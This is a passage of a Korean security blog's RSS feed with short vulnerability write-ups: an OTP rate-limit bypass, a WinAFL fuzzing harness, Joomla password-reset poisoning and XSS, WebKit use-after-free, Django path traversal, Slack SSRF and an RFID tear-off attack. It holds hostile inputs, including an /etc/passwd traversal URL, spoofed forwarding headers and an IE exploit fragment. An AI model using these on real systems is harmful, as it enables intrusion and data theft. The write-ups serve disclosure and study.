class="javascript"><span class="hljs-string">&quot;      opt(arr, 1, 0);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    opt(arr, 1, 1);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    alert(&#x27;failed&#x27;);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;&#125;&quot;</span>;</span><span class="javascript">vuln = <span class="hljs-built_in">Function</span>(vulnstr);</span>vuln();<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/internet-explorer/">internet explorer</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/uninitialized-variable/">uninitialized variable</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/15/l0ch/2021-06-15/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Rate Limit 우회를 통한 OTP Brute-Force</title>
      <link>https://hackyboiz.github.io/2021/06/14/idioth/2021-06-14/</link>
      <guid>https://hackyboiz.github.io/2021/06/14/idioth/2021-06-14/</guid>
      <pubDate>Mon, 14 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://systemweakness.com/brute-forcing-otp-via-bypassin</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://systemweakness.com/brute-forcing-otp-via-bypassing-rate-limit-c5ee6b25c2a8">OTP Brute-Force Via Rate Limit Bypass</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>One Time Password</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Rate limit가 존재하는 OTP (One Time Password) 메커니즘을 우회하여 Brute Force이 가능한 방법이 공개되었습니다. 원글의 작성자는 버그 바운티의 타깃이 되는 웹 사이트를 공개하지 않았습니다.</p><p>타깃 웹사이트에서 비밀번호를 재설정하는 부분에 제공된 이메일 주소로 OTP가 전송됩니다. Reset Password 버튼을 반복하여 클릭하고 Burp Suite로 확인하면 rate limit가 적용되어 있습니다. 따라서 연속적인 request가 발생할 시 <code>Server error</code>가 발생합니다. 하지만 <code>X-Forwarded-For: 127.0.0.1</code> 헤더를 사용하여 OTP의 time limiting을 우회할 수 있습니다. 이를 통해 <code>X-Forwarded-For</code>의 호스트 ID를 <code>127.0.0.1</code>부터 <code>127.0.0.255</code>까지 바꿔가면서 OTP를 Brute Force 할 수 있습니다.</p><p><img src="https://miro.medium.com/max/1200/1*yuL2sY-lT9Z1TESnqGR1_w.png" alt="img"></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/otp/">otp</category>
      
      <category domain="https://hackyboiz.github.io/tags/bruteforce/">bruteforce</category>
      
      <category domain="https://hackyboiz.github.io/tags/time-limiting/">time limiting</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/14/idioth/2021-06-14/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] WinAFL로 마구 퍼징하기 Part2</title>
      <link>https://hackyboiz.github.io/2021/06/13/fabu1ous/winafl-2/</link>
      <guid>https://hackyboiz.github.io/2021/06/13/fabu1ous/winafl-2/</guid>
      <pubDate>Sun, 13 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Part-1-요약&quot;&gt;&lt;a href=&quot;#Part-1-요약&quot; class=&quot;headerlink&quot; title=&quot;Part 1 요약&quot;&gt;&lt;/a&gt;Part 1 요약&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2021/06/13/fabu1ous/winafl-2/1.</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Part-1-요약"><a href="#Part-1-요약" class="headerlink" title="Part 1 요약"></a>Part 1 요약</h1><p><img src="/2021/06/13/fabu1ous/winafl-2/1.png"></p><p><img src="/2021/06/13/fabu1ous/winafl-2/2.png"></p><p>애미야… 실행속도가… 짜다…</p><p><a href="https://hackyboiz.github.io/2021/05/23/fabu1ous/winafl-1/">Part 1 보러가기</a></p><h1 id="루프-쓴다며"><a href="#루프-쓴다며" class="headerlink" title="루프 쓴다며!"></a>루프 쓴다며!</h1><p><img src="/2021/06/13/fabu1ous/winafl-2/3.png"></p><p>WinAFL은 빠른 퍼징 속도를 자랑한다고 해서 많이 기대했는데 3초에 1번 꼴로 타겟 함수를 실행하고 Total paths도 1인걸 보니 많이 허탈하더군요. 아무리 느려도 BFF 보단 빨라야 하는 거 아닌가라는 생각에 어이가 없어서 뭐가 문제일까 곰곰이 생각하던 중 이상한 걸 발견했습니다.</p><p><img src="/2021/06/13/fabu1ous/winafl-2/4.png"></p><p>실행 횟수가 늘어날때마다 PID와 함께 그 프로세스를 종료시켰다는 로그가 출력되더군요. Iteration을 할 때 몇몇 리소스가 여전히 어딘가에서 사용 중이라면 이런 현상이 발생한다고 합니다. 그래서 처음엔 타겟 함수가 child process를 생성하고 종료하지 않아 WinAFL이 대신 종료시키는 거라고 생각했습니다. ProcMon으로 WinAFL의 iteration 하나를 캡쳐하고 화면에 출력되는 PID를 찾아봤더니 child process가 아니라 harness.exe의 PID였습니다.</p><p><img src="/2021/06/13/fabu1ous/winafl-2/5.png"></p><p>Part 1에서 WinAFL은 프로세스(Harness.exe)를 종료하지 않고 타겟 함수를 루프로 반복 실행해 빠른 퍼징 속도를 낼 수 있다는 사실을 굉장히 강조했습니다. 물론 Harness를 똑바로 작성했을 때의 이야기입니다. 제가 작성한 Harness처럼 문제가 있다면 오히려 WinAFL의 저런 특징들이 독이 되서 반대로 퍼징 속도가 극악무도하게 느려집니다.</p><h1 id="그래서-뭐가-문제인가"><a href="#그래서-뭐가-문제인가" class="headerlink" title="그래서 뭐가 문제인가"></a>그래서 뭐가 문제인가</h1><p>위에서 언급한 것처럼 iteration을 할 때 몇몇 리소스가 여전히 사용 중이라면 이를 해결하기 위해 WinAFL이 프로세스를 종료합니다. 타겟함수 내에서 input 파일이 제대로 닫히지 않은 것이 문제인 것 같아서 분석해 봤습니다. ( 네, 이때서야 타겟 함수를 분석했습니다. Harness가 똑바로 동작안하는 것도 당연하지… )</p><p><img src="/2021/06/13/fabu1ous/winafl-2/6.png"></p><p>타겟 함수에는 2가지 문제점이 있었습니다. 첫 번째, input 파일을 두 번 열고 닫습니다. 타겟 함수는 파일의 손상이 있는지 확인하고 그에 맞는 핸들 번호를 리턴하는데 우선 파일을 열어 파일 시그니쳐를 읽고 검사합니다. 만약 파일 시그니처가 유효하다면 서브 루틴에서 다시 한번 더 파일을 열어 파싱 하고 검사합니다. Part1에서 설명한 대로 타겟 함수가 만족해야 할 조건은 다음과 같습니다.</p><ol><li>함수 내에서 input 파일을 열어야 함</li><li>그 파일을 파싱 해야 함</li><li>함수 내에서 input 파일을 닫아야 함</li><li>리턴까지 정상적으로 실행되어야 함</li></ol><p>여기서 3번 과정이 중요한데 Harness가 파일을 닫아야 WinAFL이 파일의 내용을 수정할 수 있습니다.</p><p>WinAFL이 파일을 mutate 하기 위해 접근하지만 Harness가 다시 사용해 실패하게 되고 강제로 Harness를 종료시키게 됩니다.</p><p>두 번째, 처음 파일을 열었을 때 파일 시그니처 “4 byte”만 읽기 때문에 퍼징에 의미 없는 동작입니다. 처음부터 타겟 함수를 조금이라도 분석했으면 이런 문제가 발생하지 않았을 텐데…</p><h1 id="Harness"><a href="#Harness" class="headerlink" title="Harness"></a>Harness</h1><p>문제점을 알아냈으니 Harness를 수정해 봅시다. 우선 타겟 함수를 변경했습니다. 기존 타겟 함수 내부에 있던 서브 루틴으로 파일의 아카이브 헤더를 읽어와 파싱 하고 검사합니다. 새로운 타겟 함수는 vtable을 인자로 받아 사용하고 <code>__thiscall</code> 호출 규약을 사용하기 때문에 그에 맞게 코드를 수정해 줬습니다.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(__thiscall *TARGET)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>* vp, <span class="hljs-keyword">wchar_t</span>* filename)</span></span>;TARGET target;<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(__thiscall *OPERATE)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>* vp)</span></span>;OPERATE pre_target;OPERATE post_target;OPERATE filecl;<span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) __declspec(noinline) <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fuzzme</span><span class="hljs-params">(<span class="hljs-keyword">int</span>* vp, <span class="hljs-keyword">wchar_t</span>* path)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> result = target(vp, path);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result: %d\\n&quot;</span>, result);filecl(vp);<span class="hljs-keyword">return</span> result;&#125;<span class="hljs-function"><span class="hljs-keyword">wchar_t</span>* <span class="hljs-title">charToWChar</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* text)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">size_t</span> size = <span class="hljs-built_in">strlen</span>(text) + <span class="hljs-number">1</span>;<span class="hljs-keyword">wchar_t</span>* wa = (<span class="hljs-keyword">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">wchar_t</span>) * size);mbstowcs(wa, text, size);<span class="hljs-keyword">return</span> wa;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> vp[<span class="hljs-number">32</span>];SetDllDirectory(<span class="hljs-string">&quot;...&quot;</span>); <span class="hljs-comment">// Dll 경로</span>HMODULE DLLHandle = LoadLibrary(<span class="hljs-string">&quot;TargetDll.dll&quot;</span>);<span class="hljs-keyword">if</span> (DLLHandle == <span class="hljs-number">0</span>)&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cannot load TargetDll.dll\\n&quot;</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\\n&quot;</span>, DLLHandle);target = (TARGET)DLLHandle + <span class="hljs-number">0x1500</span>;filecl = (OPERATE)DLLHandle + <span class="hljs-number">0x16e0</span>;pre_target = (OPERATE)DLLHandle + <span class="hljs-number">0x1000</span>;post_target = (OPERATE)DLLHandle + <span class="hljs-number">0x10c0</span>;pre_target(vp);<span class="hljs-keyword">int</span> result = fuzzme(vp, charToWChar(argv[<span class="hljs-number">1</span>]));post_target(vp);<span class="hljs-keyword">return</span> result;&#125;</code></pre><p><img src="/2021/06/13/fabu1ous/winafl-2/7.png"></p><p>프로세스 종료 문제가 사라졌고 초당 90번 정도 실행 속도가 나옵니다. WinAFL은 여전히 느리다고 불평하지만 3초에 1번 실행하던 이전 버전보단 훨씬 괜찮은 거 같습니다. 무엇보다 bff에 비하면 엄청나게 빠른 거라 저는 만족합니다.</p><h1 id="병렬-처리"><a href="#병렬-처리" class="headerlink" title="병렬 처리"></a>병렬 처리</h1><p>코어 갯수만큼 인스턴스를 돌릴 수 있습니다.</p><pre><code class="hljs apache"><span class="hljs-attribute">afl</span>-fuzz.exe -i in -o out -M fuzzer<span class="hljs-number">01</span> -D <span class="hljs-string">&quot;%DynamoRIO경로%\\bin32&quot;</span> -t <span class="hljs-number">10000</span> -- -coverage_module TargetDll.dll -target_module harness.exe -target_method fuzzme -fuzz_iterations <span class="hljs-number">5000</span> -nargs <span class="hljs-number">2</span> -- <span class="hljs-string">&quot;%harness경로%harness.exe&quot;</span> @@<span class="hljs-attribute">afl</span>-fuzz.exe -i in -o out -S fuzzer<span class="hljs-number">02</span> -D <span class="hljs-string">&quot;%DynamoRIO경로%\\bin32&quot;</span> -t <span class="hljs-number">10000</span> -- -coverage_module TargetDll.dll -target_module harness.exe -target_method fuzzme -fuzz_iterations <span class="hljs-number">5000</span> -nargs <span class="hljs-number">2</span> -- <span class="hljs-string">&quot;%harness경로%harness.exe&quot;</span> @@</code></pre><p><img src="/2021/06/13/fabu1ous/winafl-2/8.png"></p><p>8 코어라서 8개 돌리는 중입니다. 아름답습니다. harness 수정하기 전에는 CPU 40% 정도 쓰던데 지금은 83%~88%를 찍는 거 보니 기분도 좋네요.</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>음… 뭔가 엄청 길어질 거라 생각해서 Part 2로 나누긴 했는데 아무래도 실제 상용 프로그램을 분석한 내용을 상세하게 적을 수 없기 때문에 글이 많이 짧아진 거 같네요. 글로 보면 짧은데 저의 삽질은 엄청 길었습니다. ㅎㅎ. Harness를 자동으로 생성해주는 winnie-AFL이란 것도 있던데 다음 글은 아마 winnie-AFL에 관한 글이 될 거 같습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/winafl/">winafl</category>
      
      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://hackyboiz.github.io/tags/harness/">harness</category>
      
      <category domain="https://hackyboiz.github.io/tags/bug-bounty/">bug bounty</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/13/fabu1ous/winafl-2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] JOOMLA PASSWORD RESET VULNERABILITY AND A STORED XSS FOR FULL COMPROMISE</title>
      <link>https://hackyboiz.github.io/2021/06/13/j0ker/2021-06-13/</link>
      <guid>https://hackyboiz.github.io/2021/06/13/j0ker/2021-06-13/</guid>
      <pubDate>Sun, 13 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;6월 7일, Joomla 취약점 두 개의 상세 내용이 공개되었습니다.&lt;/p&gt;
&lt;p&gt;첫 번째 취약점은 임의 계정 패스워드 초기화 취약점입니다. Joomla 계정은 두 가지로 나뉘는데, 하나는 일반적인 admin 계정이고, 다른 하나는 super a</description>
        
      
      
      
      <content:encoded><![CDATA[<p>6월 7일, Joomla 취약점 두 개의 상세 내용이 공개되었습니다.</p><p>첫 번째 취약점은 임의 계정 패스워드 초기화 취약점입니다. Joomla 계정은 두 가지로 나뉘는데, 하나는 일반적인 admin 계정이고, 다른 하나는 super admin 입니다. 이 취약점으로는 admin 계정의 비밀번호를 초기화할 수 있습니다.</p><p>먼저 Joomla에 특정 계정의 패스워드 초기화를 요청하면 해당 계정 이메일로 패스워트 초기화 링크를 전송합니다.</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;  <span class="hljs-comment">// To build the entire URI we need to prepend the protocol, and the http host</span>  <span class="hljs-comment">// to the URI string.</span>   $theURI = <span class="hljs-string">&#x27;http&#x27;</span> . $https . $_SERVER[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>] . $_SERVER[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>];&#125;</code></pre><p>패스워드 초기화 링크를 구성할 때, Joomla의 URI.php에서 서버의 IP를 HOST 헤더에서 가져오는데, 이를 HOST header poisoning을 통해 조작할 수 있습니다. 그렇게 되면 해커는 보내는 링크를 해커의 서버로 조작한 다음 피해자에게 보내고, 피해자는 해당 링크를 클릭하게 됩니다. 그 순간 해커의 서버로 패스워드 초기화를 위한 토큰이 전송되어 해커는 해당 토큰을 이용해 패스워드를 초기화할 수 있게 됩니다.</p><p>두 번째 취약점은 stored XSS을 통한 admin to super admin 권한 상승 취약점입니다.</p><p>일반적인 상황에서 Joomla에서는 블랙리스트를 통해 업로드할 수 있는 파일 확장자들을 관리합니다. php, php5 등 스크립트를 삽입할 수 있는 대부분의 확장자들을 막아놓았는데, 여기에 .html이 빠져있어 html 파일을 업로드할 수 있습니다. 따라서 html 파일에 XSS 페이로드를 넣고 댓글이나 글에 넣고 업로드를 하고, super admin이 그것을 보게 되면 super admin 권한으로 XSS 페이로드가 실행되어 권한상승을 할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/xss/">xss</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/joomla/">joomla</category>
      
      <category domain="https://hackyboiz.github.io/tags/password/">password</category>
      
      <category domain="https://hackyboiz.github.io/tags/reset/">reset</category>
      
      <category domain="https://hackyboiz.github.io/tags/server/">server</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2021-26032/">CVE-2021-26032</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/13/j0ker/2021-06-13/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-21779: Webkit Webcore use-after-free</title>
      <link>https://hackyboiz.github.io/2021/06/12/fabu1ous/2021-06-12/</link>
      <guid>https://hackyboiz.github.io/2021/06/12/fabu1ous/2021-06-12/</guid>
      <pubDate>Sat, 12 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports/TALOS</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2021-1238">Webkit WebCore::GraphicsContext use-after-free vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>WebKitGTK 2.30.4</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>WebkitGTK 2.30.4의 GraphicsContext는 특정 이벤트를 핸들 할 때 use-after-free 취약점이 발생합니다. Webkit은 오픈소스 웹 콘텐츠 엔진으로 브라우저를 비롯한 여러 응용프로그램에서 사용합니다.</p><p>Webkit의 <code>fillText()</code> 함수는 HTMLCanvasElement 내부 특정 좌표에 문자열을 출력합니다. HTMLCanvasElement는 <code>m_width</code>와 <code>m_height</code>값을 갖고 있는데 이에 맞춰 <code>fillText()</code> 함수가 출력할 문자열의 좌표가 유효한 범위 내에 있는지 검사합니다.</p><p>HTMLCanvasElement는 백그라운드에서 수행된 변경 사항에 따라 <code>m_height</code> 값을 업데이트하지만 업데이트되기 이전의 <code>m_height</code>값을 사용해 메모리를 할당합니다. 또한 <code>fillGradient()</code> 함수가 호출되면 업데이트되기 이전의 값을 사용해 할당 해제된 메모리에 접근합니다.</p><p>위 취약점을 악용한 웹사이트에 접속할 경우 information leak 및 추가 memory corruption에 의한 피해를 볼 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/use-after-free/">use after free</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/webkit/">webkit</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/12/fabu1ous/2021-06-12/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-33203: Django path traversal vulnerability</title>
      <link>https://hackyboiz.github.io/2021/06/11/l0ch/2021-06-11/</link>
      <guid>https://hackyboiz.github.io/2021/06/11/l0ch/2021-06-11/</guid>
      <pubDate>Fri, 11 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-075-d</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">GHSL-2021-075: Path injection in Django - CVE-2021-33203</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tested version: Django 3.2.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>파이썬에서 작성된 오픈소스 웹 프레임워크 Django에서 path traversal 취약점이 발견되었습니다. 해당 취약점은 <code>django.contrib.admindocs</code> 모듈이 활성화되었을 때 발생합니다.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateDetailView</span>(<span class="hljs-params">BaseAdminDocsView</span>):</span>...<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_context_data</span>(<span class="hljs-params">self, **kargs</span>):</span>...template_file = Path(directory) / template<span class="hljs-keyword">if</span> template_file.exists():template_contents = template_file.read_text()...</code></pre><p><code>get_context_data()</code> 함수에서 해커는 template 변수를 임의의 값으로 설정할 수 있고 이를 별다른 검증 없이 Path join 합니다. 이를 이용해 template directory 외부 경로의 파일을 제공할 수 있어 <code>http://localhost:8000/admin/doc/templates//etc/passwd/</code>와 같은 요청을 보내는 것으로 파일 시스템 내 임의 경로의 파일 내용이 렌더링 메서드로 전달되어 파일 내용이 유출될 수 있습니다. 해당 취약점은 아래와 같이 <code>safe_join</code> 함수를 사용해 경로를 합치는 것으로 패치되었습니다.</p><pre><code class="hljs python">template_file = Path(safe_join(directory, template))</code></pre><p>자세한 패치 히스토리는 <a href="https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db">https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db</a> 에서 확인할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/django/">django</category>
      
      <category domain="https://hackyboiz.github.io/tags/python/">python</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/11/l0ch/2021-06-11/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] 헤더 수정을 통한 Slack infra metadata 유출</title>
      <link>https://hackyboiz.github.io/2021/06/10/idioth/2021-06-10/</link>
      <guid>https://hackyboiz.github.io/2021/06/10/idioth/2021-06-10/</guid>
      <pubDate>Thu, 10 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/727330&quot;&gt;Header modification</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/727330">Header modification results in disclosure of Slack infra metadata to unauthorized parties</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Slack</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>클라우드 기반 팀 협업 도구 Slack의 <em>files.slack.com</em> 도메인에서 호스트 헤더 대신 <code>X-Forwarded-Host</code> 헤더를 사용하여 infra metadata를 유출할 수 있는 취약점이 발견되었습니다.</p><p>호스트가 <em>files.slack.com</em>이 아닐 때, 해당 URL은 500 Internal server error를 반환하는 유효성 검사가 존재합니다. 하지만 호스트 이름의 끝 부분에 ‘@’를 추가하여 해당 검사를 우회할 수 있습니다. 또한 해당 request는 프론트 엔드가 아닌 백 엔드로 전달되어 Blind SSRF 취약점이 존재하면 인트라넷에 arbitrary request를 전송하여 응답 시간을 통해 다양한 정보를 확인할 수 있습니다.</p><p>이를 통해 인트라넷에 열려있는 포트를 확인하는 과정은 다음과 같습니다.</p><ol><li><p>슬랙에 파일을 업로드하고 “Open original”을 통해 원본 이미지 경로를 찾아 burp suite로 가져옵니다.</p></li><li><p>repeater로 전송하고 클릭하여 정상적으로 접근되는지 확인합니다.</p></li><li><p><code>X-Forwarded-Host: xxx.com</code>을 헤더에 추가하여 500 error가 발생하는지 확인합니다.</p></li><li><p><code>X-Forwarded-Host: file.slack.com@YOUR_DOMAIN</code>으로 헤더를 수정하고 302 response가 오는지 확인합니다. 경로는 <code>YOUR_DOMAIN/files-pri/...</code>로 지정합니다.</p></li><li><p>도메인에 request가 전송되었는지 확인하고 도메인을 인트라넷 IP로 변경합니다. 포트를 바꿔가며 응답 시간을 확인합니다.</p></li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/slack/">slack</category>
      
      <category domain="https://hackyboiz.github.io/tags/ssrf/">ssrf</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/10/idioth/2021-06-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-33881: RFID tear off attack, bypass monotonic counter</title>
      <link>https://hackyboiz.github.io/2021/06/09/fabu1ous/2021-06-09/</link>
      <guid>https://hackyboiz.github.io/2021/06/09/fabu1ous/2021-06-09/</guid>
      <pubDate>Wed, 09 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.quarkslab.com/rfid-monotonic-counter-anti-te</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.quarkslab.com/rfid-monotonic-counter-anti-tearing-defeated.html#eeprom-tear2">RFID: Monotoic Counter Anti-Tearing Defeated</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>MIFARE Ultralight EV1, MF0UL</p><p>MIFARE Ultralight C, MF0ICU</p><p>MIFARE Ultralight NANO, MF0UN</p><p>NT2L1, NT2H10, NT2H12</p><p>N2H13, NT2H15, NT2H16</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>NXP MIFARE Ultralight와 NTAG 카드는 replay 공격을 방지하기 위한 Monotonic Counter 기능을 사용하는데 해당 기능을 tear off 공격을 통해 무력화할 수 있는 취약점이 발견되었습니다. Tear off 공격이란 RFID 태그와 리더 사이 데이터 통신이 이루어지는 도중에 통신을 끊어버리는 공격 방식으로 EEPROM이 쓰기 작업을 하는 동안 RFID 태그의 데이터가 일관되지 않은 상태로 유지되어 버그가 발생하도록 유도합니다.</p><p>MIFARE Ultralight EV1은 24-bit Monotonic Counter를 사용하고 이와 관련된 커멘드를 사용합니다.</p><ol><li><code>INCR_CNT</code> : Counter를 증가시킨다.</li><li><code>READ_CNT</code> : 현태 Counter의 값을 읽는다.</li><li><code>CHECK_TEARING_EVENT</code> : anti-tearing 8-bit flag를 검증한다.</li></ol><p><code>INCR_CNT</code>를 통해 유효한 Counter의 값을 증가 시킴과 동시에 tear off 공격을 수행하면 Counter에 대한 쓰기 작업에 인터럽트를 걸 수 있고, <code>READ_CNT</code>가 이전 Counter의 값을 리턴하면서 <code>CHECK_TEARING_EVENT</code>가 정상적인 검증 flag를 리턴하는 상황을 만들 수 있습니다. </p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
